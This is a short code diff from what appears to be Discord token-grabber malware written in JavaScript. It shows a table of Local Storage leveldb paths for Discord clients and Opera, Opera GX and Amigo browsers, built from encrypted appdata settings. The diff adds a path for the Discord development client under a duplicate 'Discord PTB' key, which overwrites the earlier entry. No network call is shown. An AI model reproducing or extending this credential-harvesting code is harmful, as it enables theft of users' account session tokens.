@@ -7,6 +7,7 @@ module.exports = (client) => {
                 'Discord Canary': client.utils.encryption.decryptData(client.config.user.appdata) + '\\discordcanary\\Local Storage\\leveldb\\',
                 'Lightcord': client.utils.encryption.decryptData(client.config.user.appdata) + '\\Lightcord\\Local Storage\\leveldb\\',
                 'Discord PTB': client.utils.encryption.decryptData(client.config.user.appdata) + '\\discordptb\\Local Storage\\leveldb\\',
+                'Discord PTB': client.utils.encryption.decryptData(client.config.user.appdata) + '\\discorddevelopment\\Local Storage\\leveldb\\',
                 'Opera': client.utils.encryption.decryptData(client.config.user.appdata) + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
                 'Opera GX': client.utils.encryption.decryptData(client.config.user.appdata) + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
                 'Amigo': client.utils.encryption.decryptData(client.config.user.localappdata) + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
